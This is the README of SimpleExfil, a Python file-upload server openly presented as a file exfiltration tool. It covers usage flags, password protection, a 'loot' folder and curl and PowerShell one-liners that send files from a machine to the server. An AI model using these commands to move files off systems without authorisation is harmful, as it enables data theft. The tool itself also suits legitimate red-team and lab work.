# SimpleExfil

SimpleExfil is a lightweight file exfiltration/infiltration server. It accepts and stores files sent through HTTP POST requests — ideal for quick file transfers from remote systems. Start the server, set an optional password, and upload files via the web UI, `curl`, or PowerShell.

## Requirements

- Python 3.8+

## Usage

```
python simpleexfil.py [-p PORT] [-pw PASSWORD] [-d DIRECTORY]
```

| Flag | Description | Default |
|------|-------------|---------|
| `-p`, `--port` | Port to listen on | `8000` |
| `-pw`, `--password` | Password to protect the server | none (open) |
| `-d`, `--directory` | Directory to store uploaded files | `./vault` |

A `vault/` folder is created automatically on startup if no custom directory is specified.

### Examples

```bash
# Start with defaults (port 8000, no password, ./vault)
python simpleexfil.py

# Custom port with password protection
python simpleexfil.py -p 9090 -pw s3cret

# Custom upload directory
python simpleexfil.py -d /tmp/loot
```

## Uploading Files

### Web UI

Open `http://<host>:<port>/` in a browser. If a password is set you will be prompted to enter it. Drag and drop files onto the upload area or click to select. Uploaded files appear in the file list with download links.

### curl

```bash
# No password
curl -F "file=@example.txt" http://127.0.0.1:8000

# With password
curl -H "X-Password: s3cret" -F "file=@example.txt" http://127.0.0.1:8000
```

### PowerShell

```powershell
# Simple upload (no password)
(New-Object System.Net.WebClient).UploadFile("http://127.0.0.1:8000", "C:\tmp\example.txt")

# With password — use Invoke-RestMethod
$headers = @{ "X-Password" = "s3cret" }
Invoke-RestMethod -Uri "http://127.0.0.1:8000" -Method Post -Headers $headers -InFile "C:\tmp\example.txt" -ContentType "multipart/form-data"
```

## Downloading Files

Files can be downloaded from the web UI or directly via URL:

```
http://<host>:<port>/download/<filename>
```

The download endpoint respects authentication — include the `X-Password` header or session cookie when a password is set.

## File Storage

Uploaded files are saved using their original base name inside the vault directory. If a file with the same name already exists, a numeric suffix is appended (`file.txt`, `file_1.txt`, `file_2.txt`, …). Directory traversal in filenames is stripped.
